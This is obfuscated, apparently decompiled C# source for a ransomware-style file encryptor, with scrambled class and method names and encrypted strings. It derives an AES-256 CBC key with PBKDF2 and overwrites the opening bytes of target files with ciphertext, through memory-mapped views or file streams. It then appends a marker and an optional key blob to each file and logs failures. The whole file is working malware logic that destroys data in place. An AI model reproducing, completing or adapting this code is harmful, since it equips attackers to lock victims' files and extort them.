using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

public static class HUMYHcgEnuXOnA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] DxLpvUxqllVZ(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = tNcIMucPrczAzJXIN(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes tNcIMucPrczAzJXIN(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] SAmmtsGWAzQW(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (PYtJscelCaHU.mANJAWVWINnm == getString_0(107396905))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (PYtJscelCaHU.CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(PYtJscelCaHU.CaiUUOOprZSOI, getString_0(107389879) + string_0 + getString_0(107402360) + ex.Message + getString_0(107396790));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void zrGRplxDVNnVZ(string qGxsFVvELQptUE, byte[] qYKKNYYyDxc, byte[] lzOOtsdFUZeYWVN = null)
	{
		try
		{
			byte[] array = null;
			if (PYtJscelCaHU.mANJAWVWINnm == getString_0(107396905))
			{
				array = (PYtJscelCaHU.dTyBwXiyZmm ? Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302))) : Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(qGxsFVvELQptUE, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qYKKNYYyDxc, 0, qYKKNYYyDxc.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(qGxsFVvELQptUE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PYtJscelCaHU.dTyBwXiyZmm)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(lzOOtsdFUZeYWVN, 0, lzOOtsdFUZeYWVN.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (PYtJscelCaHU.dTyBwXiyZmm ? Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302))) : Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279))));
			FileStream fileStream2 = new FileStream(qGxsFVvELQptUE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(qYKKNYYyDxc, 0, qYKKNYYyDxc.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(qGxsFVvELQptUE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!PYtJscelCaHU.dTyBwXiyZmm)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(lzOOtsdFUZeYWVN, 0, lzOOtsdFUZeYWVN.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (PYtJscelCaHU.CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(PYtJscelCaHU.CaiUUOOprZSOI, getString_0(107389879) + qGxsFVvELQptUE + getString_0(107402293) + ex.Message + getString_0(107396790));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (PYtJscelCaHU.dTyBwXiyZmm ? Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402302))) : Encoding.ASCII.GetBytes(PYtJscelCaHU.sZXTHnjVRHJHh(PYtJscelCaHU.DxZVhodwqDtHV) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279)) + Convert.ToString(PYtJscelCaHU.gxaokSriQGuW) + PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402279))));
			FileStream fileStream4 = new FileStream(qGxsFVvELQptUE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(qYKKNYYyDxc, 0, qYKKNYYyDxc.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(qGxsFVvELQptUE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!PYtJscelCaHU.dTyBwXiyZmm)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(lzOOtsdFUZeYWVN, 0, lzOOtsdFUZeYWVN.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static HUMYHcgEnuXOnA()
	{
		Strings.CreateGetStringDelegate(typeof(HUMYHcgEnuXOnA));
	}
}
